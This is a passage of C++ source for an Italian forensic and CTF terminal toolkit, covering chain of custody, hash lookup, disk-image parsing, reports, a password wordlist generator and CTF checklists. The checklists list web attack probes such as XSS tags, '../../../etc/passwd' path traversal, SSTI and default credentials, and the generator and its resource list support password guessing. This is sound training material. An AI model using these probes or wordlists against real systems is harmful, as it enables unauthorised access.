        std::string md5hash  = MD5::hashFile(file);
        std::string sha256h  = SHA256::hashFile(file);
        struct stat st; stat(file.c_str(), &st);

        // Nome log basato su caso
        std::string logFile = logDir + "/" + caso + ".coc";
        std::ofstream out(logFile, std::ios::app);
        time_t now = time(nullptr);

        out << "=== CHAIN OF CUSTODY ===\n";
        out << "Caso       : " << caso << "\n";
        out << "Analista   : " << analista << "\n";
        out << "File       : " << file << "\n";
        out << "Dimensione : " << st.st_size << " bytes\n";
        out << "MD5        : " << md5hash << "\n";
        out << "SHA-256    : " << sha256h << "\n";
        out << "Timestamp  : " << timeStr(now) << "\n";
        out << "Azione     : ACQUISIZIONE INIZIALE\n";
        out << std::string(50,'-') << "\n";
        out.close();

        std::cout << Color::CYAN << "\n  CHAIN OF CUSTODY CREATA\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;
        std::cout << Color::YELLOW << "  Caso     : " << Color::WHITE << caso << "\n";
        std::cout << Color::YELLOW << "  Analista : " << Color::WHITE << analista << "\n";
        std::cout << Color::YELLOW << "  File     : " << Color::WHITE << file << "\n";
        std::cout << Color::YELLOW << "  MD5      : " << Color::GREEN << md5hash << "\n";
        std::cout << Color::YELLOW << "  SHA-256  : " << Color::GREEN << sha256h << "\n";
        std::cout << Color::YELLOW << "  Log      : " << Color::WHITE << logFile << "\n\n" << Color::RESET;

    } else if (sub == "add" && args.size() >= 5) {
        std::string caso = args[2], azione = args[3];
        std::string note; for(size_t i=4;i<args.size();i++){if(i>4)note+=" ";note+=args[i];}
        std::string logFile = logDir + "/" + caso + ".coc";
        if (!fileExists(logFile)) { std::cout<<Color::RED<<"  Caso non trovato: "<<caso<<Color::RESET<<"\n\n"; return; }
        std::ofstream out(logFile, std::ios::app);
        time_t now = time(nullptr);
        std::string user = getenv("USER") ? getenv("USER") : "unknown";
        out << "Timestamp  : " << timeStr(now) << "\n";
        out << "Utente     : " << user << "\n";
        out << "Azione     : " << azione << "\n";
        out << "Note       : " << note << "\n";
        out << std::string(50,'-') << "\n";
        out.close();
        std::cout << Color::BGREEN << "\n  Evento aggiunto al caso " << caso << "\n\n" << Color::RESET;

    } else if (sub == "show" && args.size() >= 3) {
        std::string caso = args[2];
        std::string logFile = logDir + "/" + caso + ".coc";
        std::ifstream in(logFile);
        if (!in) { std::cout<<Color::RED<<"  Caso non trovato: "<<caso<<Color::RESET<<"\n\n"; return; }
        std::cout << Color::CYAN << "\n  CHAIN OF CUSTODY: " << caso << "\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
        std::string line;
        while(std::getline(in,line)) {
            if(line.find("SHA-256")!=std::string::npos||line.find("MD5")!=std::string::npos)
                std::cout<<Color::GREEN<<"  "<<line<<Color::RESET<<"\n";
            else if(line.find("Azione")!=std::string::npos)
                std::cout<<Color::YELLOW<<"  "<<line<<Color::RESET<<"\n";
            else if(line.find("===")!=std::string::npos||line[0]=='-')
                std::cout<<Color::CYAN<<"  "<<line<<Color::RESET<<"\n";
            else
                std::cout<<Color::WHITE<<"  "<<line<<Color::RESET<<"\n";
        }
        std::cout<<"\n";

    } else if (sub == "verify" && args.size() >= 4) {
        std::string caso = args[2], file = args[3];
        std::string logFile = logDir + "/" + caso + ".coc";
        std::ifstream in(logFile);
        if (!in) { std::cout<<Color::RED<<"  Caso non trovato.\n"<<Color::RESET; return; }

        // Estrai hash originale dal log
        std::string origMd5, origSha;
        std::string line;
        while(std::getline(in,line)) {
            if(line.find("MD5        :")!=std::string::npos) origMd5=trim(line.substr(line.find(':')+1));
            if(line.find("SHA-256    :")!=std::string::npos) origSha=trim(line.substr(line.find(':')+1));
        }

        std::string curMd5   = MD5::hashFile(file);
        std::string curSha   = SHA256::hashFile(file);
        bool md5ok  = (curMd5  == origMd5);
        bool sha256ok = (curSha == origSha);

        std::cout << Color::CYAN << "\n  VERIFICA INTEGRITA': " << file << "\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
        std::cout << Color::YELLOW << "  MD5 originale : " << Color::WHITE << origMd5 << "\n";
        std::cout << Color::YELLOW << "  MD5 attuale   : " << (md5ok?Color::GREEN:Color::BRED) << curMd5 << Color::RESET << "\n";
        std::cout << Color::YELLOW << "  SHA-256 orig  : " << Color::WHITE << origSha << "\n";
        std::cout << Color::YELLOW << "  SHA-256 att.  : " << (sha256ok?Color::GREEN:Color::BRED) << curSha << Color::RESET << "\n";
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
        if (md5ok && sha256ok)
            std::cout << Color::BGREEN << "  INTEGRITA' VERIFICATA — il file non e' stato modificato\n" << Color::RESET;
        else
            std::cout << Color::BRED << "  ATTENZIONE — il file risulta MODIFICATO rispetto all'acquisizione!\n" << Color::RESET;
        std::cout << "\n";
    } else {
        std::cout << Color::YELLOW << "  Argomenti non validi. Digita: custody\n\n" << Color::RESET;
    }
}

// ═══════════════════════════════════════════════════════════════
//  CMD: hashdb — confronto con database hash noti (NSRL-like)
// ═══════════════════════════════════════════════════════════════
void cmdHashDb(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: hashdb <file>         controlla se hash e' noto\n"
                  << "     hashdb add <hash> <nome>   aggiungi al database locale\n"
                  << "     hashdb import <file.txt>   importa lista hash\n"
                  << "     hashdb list                mostra database locale\n" << Color::RESET;
        return;
    }
    std::string dbPath = std::string(getenv("HOME")?getenv("HOME"):".") + "/.nexus/hashdb.txt";
    std::string sub = toLower(args[1]);

    // Carica db locale
    std::map<std::string,std::string> db;
    std::ifstream dbin(dbPath);
    std::string dline;
    while(std::getline(dbin,dline)) {
        auto pos = dline.find('|');
        if(pos!=std::string::npos) db[trim(dline.substr(0,pos))]=trim(dline.substr(pos+1));
    }

    if (sub == "list") {
        std::cout << Color::CYAN << "\n  HASH DATABASE LOCALE (" << db.size() << " entries)\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;
        for(auto& p:db)
            std::cout<<Color::GREEN<<" "<<std::left<<std::setw(34)<<p.first
                     <<Color::WHITE<<p.second<<Color::RESET<<"\n";
        std::cout<<"\n"; return;
    }

    if (sub == "add" && args.size() >= 4) {
        std::string hash=toLower(args[2]), name;
        for(size_t i=3;i<args.size();i++){if(i>3)name+=" ";name+=args[i];}
        std::ofstream out(dbPath, std::ios::app);
        out << hash << "|" << name << "\n";
        db[hash]=name;
        std::cout<<Color::BGREEN<<"  Aggiunto: "<<hash<<" -> "<<name<<Color::RESET<<"\n\n";
        return;
    }

    if (sub == "import" && args.size() >= 3) {
        std::ifstream imp(args[2]);
        if(!imp){std::cout<<Color::RED<<"  File non trovato.\n"<<Color::RESET;return;}
        std::ofstream out(dbPath, std::ios::app);
        int count=0; std::string l;
        while(std::getline(imp,l)){l=trim(l);if(!l.empty()){out<<l<<"\n";count++;}}
        std::cout<<Color::BGREEN<<"  Importati "<<count<<" hash.\n\n"<<Color::RESET;
        return;
    }

    // Controlla file
    std::string path = args[1];
    if (!fileExists(path)) { std::cout<<Color::RED<<"  File non trovato: "<<path<<Color::RESET<<"\n\n"; return; }

    std::string md5h   = toLower(MD5::hashFile(path));
    std::string sha256h = toLower(SHA256::hashFile(path));

    std::cout << Color::CYAN << "\n  HASH DATABASE CHECK: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  MD5    : " << Color::WHITE << md5h << "\n";
    std::cout << Color::YELLOW << "  SHA-256: " << Color::WHITE << sha256h << "\n\n" << Color::RESET;

    bool found = false;
    for(auto& h : {md5h, sha256h}) {
        if(db.count(h)) {
            std::cout<<Color::BGREEN<<"  MATCH: "<<Color::WHITE<<h<<" -> "<<db[h]<<Color::RESET<<"\n";
            found = true;
        }
    }
    if (!found) {
        std::cout << Color::DIM << "  Nessuna corrispondenza nel database locale.\n";
        std::cout << "  Per database NSRL completo: https://www.nist.gov/itl/ssd/software-quality-group/nsrl\n" << Color::RESET;
    }

    // Hash noti di malware comuni (lista minima di esempio)
    std::map<std::string,std::string> knownBad = {
        {"d41d8cd98f00b204e9800998ecf8427e","Empty file (MD5)"},
        {"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","Empty file (SHA-256)"},
    };
    for(auto& h:{md5h,sha256h}) {
        if(knownBad.count(h))
            std::cout<<Color::YELLOW<<"  Nota: "<<knownBad[h]<<Color::RESET<<"\n";
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: diskimage — analisi immagini disco .dd / .e01
// ═══════════════════════════════════════════════════════════════
void cmdDiskImage(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: diskimage <file.dd|file.e01> [--info] [--carve] [--hash]\n"
                  << "     diskimage create <device> <output.dd>   crea immagine disco\n" << Color::RESET;
        return;
    }

    if (toLower(args[1]) == "create") {
        if (args.size() < 4) { std::cout<<Color::YELLOW<<"  Uso: diskimage create <device> <output.dd>\n"<<Color::RESET; return; }
        std::string dev=args[2], out=args[3];
        std::cout << Color::CYAN << "\n  DISK IMAGE: " << dev << " -> " << out << "\n" << Color::RESET;
        std::cout << Color::YELLOW << "  Comando da eseguire:\n" << Color::RESET;
        std::cout << Color::WHITE << "  sudo dd if=" << dev << " of=" << out << " bs=4M conv=sync,noerror status=progress\n\n" << Color::RESET;
        std::cout << Color::DIM << "  Verifica integrità dopo:\n";
        std::cout << "  md5sum " << out << "\n\n" << Color::RESET;
        return;
    }

    std::string path = args[1];
    bool doCarve=false, doInfo=true, doHash=false;
    for(size_t i=2;i<args.size();i++) {
        if(args[i]=="--carve") doCarve=true;
        if(args[i]=="--hash")  doHash=true;
        if(args[i]=="--info")  doInfo=true;
    }

    if (!fileExists(path)) { std::cout<<Color::RED<<"  File non trovato: "<<path<<Color::RESET<<"\n\n"; return; }

    struct stat st; stat(path.c_str(), &st);

    // Rileva formato
    std::ifstream f(path, std::ios::binary);
    uint8_t hdr[8]={0}; f.read((char*)hdr,8);
    std::string fmt = "RAW/DD";
    if(hdr[0]=='E'&&hdr[1]=='V'&&hdr[2]=='F') fmt="EnCase EWF/E01";
    if(hdr[0]=='A'&&hdr[1]=='F'&&hdr[2]=='F') fmt="AFF (Advanced Forensic Format)";

    std::cout << Color::CYAN << "\n  DISK IMAGE ANALYSIS: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Formato    : " << Color::WHITE << fmt << "\n";
    std::cout << Color::YELLOW << "  Dimensione : " << Color::WHITE << humanSize(st.st_size) << "\n";
    std::cout << Color::YELLOW << "  Modificato : " << Color::WHITE << timeStr(st.st_mtime) << "\n";

    if (doHash) {
        std::cout << Color::YELLOW << "  MD5        : " << Color::GREEN << MD5::hashFile(path) << "\n" << Color::RESET;
        std::cout << Color::YELLOW << "  SHA-256    : " << Color::GREEN << SHA256::hashFile(path) << "\n" << Color::RESET;
    }

    // Cerca partizioni (MBR)
    f.seekg(0);
    std::vector<uint8_t> sector(512,0);
    f.read((char*)sector.data(),512);

    if (sector[510]==0x55 && sector[511]==0xAA) {
        std::cout << Color::YELLOW << "\n  Tipo boot  : " << Color::WHITE << "MBR (Master Boot Record)\n" << Color::RESET;
        std::cout << Color::YELLOW << "  Partizioni :\n" << Color::RESET;
        for (int p=0;p<4;p++) {
            int off = 446 + p*16;
            uint8_t status = sector[off];
            uint8_t type   = sector[off+4];
            if (type == 0) continue;
            uint32_t lbaStart, lbaSize;
            memcpy(&lbaStart, &sector[off+8],  4);
            memcpy(&lbaSize,  &sector[off+12], 4);
            std::string fsType;
            switch(type) {
                case 0x0B: case 0x0C: fsType="FAT32"; break;
                case 0x07: fsType="NTFS/exFAT"; break;
                case 0x83: fsType="Linux ext2/3/4"; break;
                case 0x82: fsType="Linux Swap"; break;
                case 0xEE: fsType="GPT Protective"; break;
                default: { std::ostringstream o; o<<"Type 0x"<<std::hex<<(int)type; fsType=o.str(); }
            }
            std::cout << Color::GREEN << "    P" << p+1 << ": " << Color::WHITE
                      << std::left << std::setw(16) << fsType
                      << Color::DIM << " LBA=" << lbaStart << " size=" << humanSize((uint64_t)lbaSize*512)
                      << (status==0x80?" [BOOT]":"") << Color::RESET << "\n";
        }
    }

    if (doCarve) {
        std::cout << Color::YELLOW << "\n  Avvio file carving...\n" << Color::RESET;
        std::vector<std::string> carveArgs = {"carve", path, "--out", path+"_carved"};
        cmdCarve(carveArgs);
    }

    std::cout << Color::DIM << "\n  Tip: per analisi completa usa 'autopsy' o 'sleuthkit'\n" << Color::RESET;
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: report forense avanzato (testo strutturato)
// ═══════════════════════════════════════════════════════════════
void cmdForensicReport(const std::vector<std::string>& args) {
    if (args.size() < 3) {
        std::cout << Color::YELLOW << "Uso: freport <file> <caso> [--out report.txt] [--full]\n"
                  << "  Genera report forense professionale strutturato\n" << Color::RESET;
        return;
    }
    std::string path=args[1], caso=args[2];
    std::string outPath=caso+"_report.txt";
    bool full=false;
    for(size_t i=3;i<args.size();i++){
        if(args[i]=="--out"&&i+1<args.size()) outPath=args[++i];
        if(args[i]=="--full") full=true;
    }

    if (!fileExists(path)) { std::cout<<Color::RED<<"  File non trovato: "<<path<<Color::RESET<<"\n\n"; return; }

    struct stat st; stat(path.c_str(), &st);
    auto pw  = getpwuid(st.st_uid);
    time_t now = time(nullptr);
    std::string analyst = getenv("USER") ? getenv("USER") : "N/D";

    std::ofstream out(outPath);
    if (!out) { std::cout<<Color::RED<<"  Impossibile creare file output.\n"<<Color::RESET; return; }

    auto line = [&](int n=60){ out<<std::string(n,'=')<<"\n"; };
    auto sec  = [&](const std::string& t){ out<<"\n"<<std::string(60,'-')<<"\n  "<<t<<"\n"<<std::string(60,'-')<<"\n"; };

    line();
    out << "         REPORT DI ANALISI FORENSE DIGITALE\n";
    line();
    out << "\n";
    out << "  Numero caso    : " << caso << "\n";
    out << "  Analista       : " << analyst << "\n";
    out << "  Data analisi   : " << timeStr(now) << "\n";
    out << "  Tool           : NEXUS Forensic Terminal v1.0\n";
    out << "  OS             : ";
#ifdef __APPLE__
    out << "macOS\n";
#else
    out << "Linux\n";
#endif

    sec("1. IDENTIFICAZIONE EVIDENZA");
    out << "  Percorso       : " << path << "\n";
    out << "  Tipo           : " << detectFileType(path) << "\n";
    out << "  Dimensione     : " << st.st_size << " bytes (" << humanSize(st.st_size) << ")\n";
    out << "  Permessi       : " << permString(st.st_mode) << "\n";
    out << "  Proprietario   : " << (pw?pw->pw_name:std::to_string(st.st_uid)) << " (uid=" << st.st_uid << ")\n";
    out << "  Inode          : " << st.st_ino << "\n";

    sec("2. TIMESTAMP");
    out << "  Accesso (atime): " << timeStr(st.st_atime) << "\n";
    out << "  Modifica (mtime): " << timeStr(st.st_mtime) << "\n";
    out << "  Cambio (ctime) : " << timeStr(st.st_ctime) << "\n";

    sec("3. HASH CRITTOGRAFICI");
    std::string md5h   = MD5::hashFile(path);
    std::string sha256h = SHA256::hashFile(path);
    out << "  MD5    : " << md5h << "\n";
    out << "  SHA-256: " << sha256h << "\n";
    out << "\n  NOTA: conservare questi hash per verificare l'integrità futura.\n";

    sec("4. ANALISI STATISTICA");
    std::ifstream f(path, std::ios::binary);
    size_t freq[256]={0}; size_t total=0; char c;
    while(f.get(c)){freq[(uint8_t)c]++;total++;}
    double entropy=0;
    for(int i=0;i<256;i++) if(freq[i]>0){double p=(double)freq[i]/total; entropy-=p*log2(p);}
    out << "  Entropia: " << std::fixed << std::setprecision(4) << entropy << " bit/byte\n";
    if(entropy>7.5) out << "  Valutazione: ALTA ENTROPIA — possibilmente cifrato o compresso\n";
    else if(entropy>4.0) out << "  Valutazione: Entropia normale\n";
    else out << "  Valutazione: Bassa entropia — dati ridondanti\n";

    if (full) {
        sec("5. HEADER (primi 64 byte)");
        std::ifstream f2(path, std::ios::binary);
        uint8_t hdr[64]={0}; f2.read((char*)hdr,64);
        size_t nr=f2.gcount();
        out << std::hex << std::setfill('0');
        for(size_t i=0;i<nr;i+=16){
            out<<"  "<<std::setw(8)<<i<<"  ";
            for(size_t j=0;j<16&&i+j<nr;j++) out<<std::setw(2)<<(int)hdr[i+j]<<" ";
            out<<"  |  ";
            for(size_t j=0;j<16&&i+j<nr;j++) out<<(char)(hdr[i+j]>=32&&hdr[i+j]<=126?hdr[i+j]:'.');
            out<<"\n";
        }
        out<<std::dec;

        sec("6. STRINGHE RILEVANTI");
        std::ifstream f3(path, std::ios::binary);
        std::string cur; int found=0;
        while(f3.get(c)){
            if(c>=32&&c<=126) cur+=c;
            else { if(cur.size()>=8){out<<"  "<<cur<<"\n";found++;} cur.clear(); }
        }
        out<<"  Totale stringhe (>=8 char): "<<found<<"\n";
    }

    sec("FINE REPORT");
    out << "  Generato il: " << timeStr(now) << "\n";
    out << "  Da: NEXUS Forensic Terminal\n";
    line();
    out.close();

    std::cout << Color::BGREEN << "\n  Report generato: " << Color::WHITE << outPath << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: wordgen — genera wordlist da pattern
// ─────────────────────────────────────────────
void cmdWordGen(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: wordgen <tipo> [args]\n"
                  << "  wordgen leet <word>            variazioni leet speak\n"
                  << "  wordgen dates <year>           combinazioni data\n"
                  << "  wordgen combine <w1> <w2>      combinazioni due parole\n"
                  << "  wordgen suffixes <word>        parola + suffissi comuni\n"
                  << "  wordgen custom <word> [opts]   wordlist custom avanzata\n"
                  << "  wordgen mask <mask>            genera da maschera (?l?u?d?s)\n"
                  << "  wordgen resources              dove trovare wordlist professionali\n"
                  << "\n  Opzioni custom: --leet --upper --dates --nums --save <file>\n"
                  << Color::RESET; return;
    }
    std::string mode = toLower(args[1]);

    std::cout << Color::CYAN << "\n  WORDLIST GENERATOR [" << mode << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  Per uso su sistemi di propria proprieta' o CTF.\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;

    std::vector<std::string> words;

    if (mode == "leet" && args.size() >= 3) {
        std::string word = args[2];
        std::map<char,std::string> leet = {
            {'a',"4"},{'e',"3"},{'i',"1"},{'o',"0"},
            {'s',"5"},{'t',"7"},{'g',"9"},{'b',"8"},{'l',"1"}
        };
        std::set<std::string> variants;
        variants.insert(word);
        variants.insert(toLower(word));
        std::string upper = word;
        std::transform(upper.begin(),upper.end(),upper.begin(),::toupper);
        variants.insert(upper);
        std::string leetWord = toLower(word);
        for (char& c : leetWord) {
            auto it = leet.find(c);
            if (it != leet.end()) c = it->second[0];
        }
        variants.insert(leetWord);
        for (auto& v : std::vector<std::string>{word, leetWord, upper}) {
            for (auto& s : std::vector<std::string>{"","!","123","1234","@","#","2024","2025","01","*"})
                variants.insert(v+s);
        }
        for (auto& v : variants) words.push_back(v);

    } else if (mode == "dates" && args.size() >= 3) {
        int year = std::stoi(args[2]);
        for (int y = year-3; y <= year+1; y++)
            for (int m = 1; m <= 12; m++)
                for (int d = 1; d <= 31; d+=5) {
                    std::ostringstream oss;
                    oss << std::setw(4) << std::setfill('0') << y
                        << std::setw(2) << std::setfill('0') << m
                        << std::setw(2) << std::setfill('0') << d;
                    words.push_back(oss.str());
                    std::ostringstream oss2;
                    oss2 << std::setw(2)<<std::setfill('0')<<d<<"/"
                         << std::setw(2)<<std::setfill('0')<<m<<"/"<<y;
                    words.push_back(oss2.str());
                }

    } else if (mode == "combine" && args.size() >= 4) {
        std::string w1 = args[2], w2 = args[3];
        for (auto& s : std::vector<std::string>{"","_","-",".","+","@","!","123","2024","2025","#","*"}) {
            words.push_back(w1+s+w2);
            words.push_back(w2+s+w1);
            words.push_back(toLower(w1)+s+toLower(w2));
        }

    } else if (mode == "suffixes" && args.size() >= 3) {
        std::string base = args[2];
        for (auto& s : std::vector<std::string>{
            "","1","12","123","1234","12345","123456",
            "!","@","#","*","!!","!@#",
            "2020","2021","2022","2023","2024","2025",
            "01","007","99","000",
            "_admin","_user","_pass","_root","_test",
            "password","pass","pwd"})
            words.push_back(base+s);

    } else if (mode == "custom" && args.size() >= 3) {
        std::string base = args[2];
        bool doLeet=false, doUpper=false, doDates=false, doNums=false;
        std::string saveFile;
        for (size_t i = 3; i < args.size(); i++) {
            if (args[i]=="--leet")  doLeet=true;
            if (args[i]=="--upper") doUpper=true;
            if (args[i]=="--dates") doDates=true;
            if (args[i]=="--nums")  doNums=true;
            if (args[i]=="--save" && i+1<args.size()) saveFile=args[++i];
        }
        std::set<std::string> set;
        set.insert(base);
        set.insert(toLower(base));
        if (doUpper) { std::string u=base; std::transform(u.begin(),u.end(),u.begin(),::toupper); set.insert(u); }
        if (doLeet) {
            std::map<char,char> lt={{'a','4'},{'e','3'},{'i','1'},{'o','0'},{'s','5'},{'t','7'}};
            std::string lw=toLower(base);
            for(char& c:lw){auto it=lt.find(c);if(it!=lt.end())c=it->second;}
            set.insert(lw);
        }
        std::vector<std::string> base_words(set.begin(),set.end());
        std::vector<std::string> suffixes = {"","!","123","2024","2025","@","#","*"};
        if (doNums) for(int i=0;i<=99;i++) suffixes.push_back(std::to_string(i));
        if (doDates) for(int y=2020;y<=2025;y++) suffixes.push_back(std::to_string(y));
        for(auto& b:base_words) for(auto& s:suffixes) set.insert(b+s);
        for(auto& w:set) words.push_back(w);

        if (!saveFile.empty()) {
            std::ofstream f(saveFile);
            if (f) { for(auto& w:words) f<<w<<"\n"; f.close();
                std::cout<<Color::BGREEN<<"  Salvato in: "<<saveFile<<" ("<<words.size()<<" parole)\n"<<Color::RESET; }
        }

    } else if (mode == "mask" && args.size() >= 3) {
        // Maschera: ?l=minuscolo ?u=maiuscolo ?d=cifra ?s=speciale
        std::string mask = args[2];
        std::map<std::string,std::string> charsets = {
            {"?l","abcdefghijklmnopqrstuvwxyz"},
            {"?u","ABCDEFGHIJKLMNOPQRSTUVWXYZ"},
            {"?d","0123456789"},
            {"?s","!@#$%^&*()-_=+[]{}|;:,.<>?"}
        };
        std::cout << Color::YELLOW << "  Maschera: " << mask << "\n" << Color::RESET;
        std::cout << Color::DIM << "  Nota: per maschere lunghe usa hashcat --mask direttamente\n\n";
        std::cout << "  Charset:\n";
        for(auto& p:charsets)
            std::cout << "  " << p.first << " = " << p.second << "\n";
        std::cout << Color::RESET << "\n";
        std::cout << Color::DIM << "  Esempio hashcat: hashcat -a 3 hash.txt " << mask << "\n\n" << Color::RESET;
        return;

    } else if (mode == "resources") {
        std::cout << Color::CYAN << "\n  WORDLIST PROFESSIONALI — DOVE TROVARLE\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n\n" << Color::RESET;

        std::cout << Color::BYELLOW << "  SecLists (la piu' completa, gratuita)\n" << Color::RESET;
        std::cout << Color::WHITE << "  git clone https://github.com/danielmiessler/SecLists\n\n";

        std::cout << Color::BYELLOW << "  RockYou (14M password da breach reale)\n" << Color::RESET;
        std::cout << Color::WHITE << "  Su Kali: /usr/share/wordlists/rockyou.txt.gz\n";
        std::cout << Color::WHITE << "  Download: https://github.com/brannondorsey/naive-hashcat/releases\n\n";

        std::cout << Color::BYELLOW << "  Kaonashi (ottimizzata per password italiane)\n" << Color::RESET;
        std::cout << Color::WHITE << "  https://github.com/kaonashi-passwords/Kaonashi\n\n";

        std::cout << Color::BYELLOW << "  CrackStation (1.5 miliardi di parole)\n" << Color::RESET;
        std::cout << Color::WHITE << "  https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n\n";

        std::cout << Color::BYELLOW << "  Weakpass (raccolta di dizionari)\n" << Color::RESET;
        std::cout << Color::WHITE << "  https://weakpass.com\n\n";

        std::cout << Color::BYELLOW << "  Su Kali Linux sono gia' preinstallate in:\n" << Color::RESET;
        std::cout << Color::WHITE << "  /usr/share/wordlists/\n\n";

        std::cout << Color::DIM << "  DISCLAIMER: usare queste wordlist solo su sistemi\n";
        std::cout << "  propri o con autorizzazione scritta del proprietario.\n" << Color::RESET << "\n";
        return;

    } else {
        std::cout << Color::RED << "  Argomenti non validi. Digita: wordgen\n" << Color::RESET;
        std::cout << "\n"; return;
    }

    // Output parole
    std::string saveFile;
    for (size_t i = 2; i < args.size(); i++)
        if (args[i]=="--save" && i+1<args.size()) saveFile=args[++i];

    for (auto& w : words)
        std::cout << Color::GREEN << "  " << w << Color::RESET << "\n";

    std::cout << Color::YELLOW << "\n  Totale: " << words.size() << " parole" << Color::RESET << "\n";

    if (!saveFile.empty() && mode != "custom") {
        std::ofstream f(saveFile);
        if (f) { for(auto& w:words) f<<w<<"\n"; f.close();
            std::cout<<Color::BGREEN<<"  Salvato in: "<<saveFile<<"\n"<<Color::RESET; }
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: ctf — toolkit CTF rapido
// ─────────────────────────────────────────────
void cmdCtf(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: ctf <tipo>\n"
                  << "  ctf checklist   lista di controllo per CTF\n"
                  << "  ctf steg        checklist steganografia\n"
                  << "  ctf crypto      crypto hints\n"
                  << "  ctf web         web exploitation hints\n"
                  << "  ctf rev         reverse engineering hints\n"
                  << "  ctf pwn         binary exploitation hints\n" << Color::RESET; return;
    }
    std::string type=toLower(args[1]);
    std::cout << Color::CYAN << "\n  🚩 CTF TOOLKIT [" << type << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    if (type=="checklist") {
        std::vector<std::string> steps={
            "[ ] Leggi attentamente la descrizione — il flag potrebbe essere nella challenge",
            "[ ] Identifica la categoria (web/crypto/rev/pwn/steg/misc/osint)",
            "[ ] fileinfo + magic bytes sul file dato",
            "[ ] strings -a -n 4 file | grep -i flag",
            "[ ] hexdump -C file | head",
            "[ ] binwalk -e file (estrai embedded files)",
            "[ ] entropy analysis (alta = cifrato/compresso)",
            "[ ] Hash del file — cerca online (hashcat/CrackStation)",
            "[ ] Controlla metadata (exiftool, strings su PDF/DOCX)",
            "[ ] Prova decodifiche: base64, hex, rot13, morse, binary",
            "[ ] Cerca pattern flag noti: CTF{...}, FLAG{...}, flag{...}",
            "[ ] Controlla dati nascosti after EOF",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    } else if (type=="steg") {
        std::vector<std::string> steps={
            "[ ] stego <file> — analisi LSB e after-EOF",
            "[ ] strings <file> | grep -i flag",
            "[ ] hexdump <file> — controlla header corretto",
            "[ ] binwalk <file> — cerca file embedded",
            "[ ] Strumenti esterni: steghide, zsteg, stegsolve, exiftool",
            "[ ] Per PNG: zsteg file.png (analisi LSB channels)",
            "[ ] Per JPEG: steghide extract -sf file.jpg",
            "[ ] Per WAV: Audacity → spectrogram view",
            "[ ] Per BMP: analisi palette e colori",
            "[ ] Controlla commenti nei chunk PNG (tEXt, zTXt)",
            "[ ] Prova password comuni: 'password', '', nome file",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    } else if (type=="crypto") {
        std::vector<std::string> steps={
            "[ ] Identifica il tipo di cipher (hashid, lunghezza, charset)",
            "[ ] Entropia bassa → sostituzione classica (Caesar, Vigenere)",
            "[ ] ROT13, ROT47, Atbash",
            "[ ] Rail Fence, Columnar transposition",
            "[ ] Base encodings: 32, 58, 62, 85",
            "[ ] Hash cracking: CrackStation.net, hashes.com, hashcat",
            "[ ] RSA: cerca n piccolo, fattorizza con factordb.com",
            "[ ] RSA small e: Hastad broadcast attack, Wiener attack",
            "[ ] Padding oracle: usa padbuster",
            "[ ] AES ECB: stesso plaintext → stesso ciphertext (pattern visibili)",
            "[ ] XOR con chiave ripetuta: analisi IC (Index of Coincidence)",
            "[ ] OTP: two-time pad attack se stesso keystream usato due volte",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    } else if (type=="web") {
        std::vector<std::string> steps={
            "[ ] Ispeziona sorgente HTML (flag in commenti?)",
            "[ ] robots.txt, sitemap.xml, .well-known/",
            "[ ] Burp Suite per intercettare e modificare richieste",
            "[ ] Cookie manipulation (base64 decode, JWT decode)",
            "[ ] SQLi: payload su ogni parametro input",
            "[ ] XSS: <script>alert(1)</script> in ogni campo",
            "[ ] LFI: ../../../etc/passwd in parametri file",
            "[ ] XXE: se accetta XML, inietta entity",
            "[ ] SSTI: {{7*7}} in ogni campo di testo",
            "[ ] SSRF: parametri URL che fanno richieste",
            "[ ] Directory bruteforce: gobuster/feroxbuster",
            "[ ] Admin panel: /admin, /dashboard, /panel, /manager",
            "[ ] Default creds: admin:admin, admin:password, root:root",
            "[ ] Header HTTP insoliti: X-Flag, X-Secret, X-Admin",
        };
        for(auto& s:steps) std::cout<<Color::WHITE<<"  "<<s<<"\n"<<Color::RESET;
    } else if (type=="rev") {
        std::vector<std::string> steps={
            "[ ] file <binary> — identifica tipo e architettura",
            "[ ] strings -a <binary> — cerca flag e stringhe utili",
            "[ ] ltrace <binary> — traccia chiamate a librerie",
            "[ ] strace <binary> — traccia syscalls",
            "[ ] Ghidra o IDA Free per decompilazione",
            "[ ] gdb per debugging: break main, run, step",
            "[ ] Cerca funzioni: strcmp, memcmp, strncmp (password check)",
            "[ ] Cerca xor loops (cifratura custom)",
            "[ ] Controlla sezione .rodata per stringhe hardcoded",
            "[ ] upx -d binary — decomprime se packed con UPX",
